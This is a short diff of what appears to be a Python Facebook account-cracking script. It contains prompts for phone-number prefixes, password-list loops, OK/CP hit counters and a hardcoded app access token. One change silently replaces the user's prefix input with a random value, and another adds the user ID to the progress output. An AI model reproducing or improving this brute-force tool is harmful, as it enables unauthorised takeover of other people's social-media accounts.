@@ -374,7 +374,8 @@ def india():
 		user=[]
 		clear()
 		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840  ');linex()
-		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
+		cod = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
+		code= random.choice([6,7,8,9])
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
 		clear()
@@ -904,7 +905,7 @@ def api3(ids,names,passlist):
 def rndm1(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}{uid}{G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
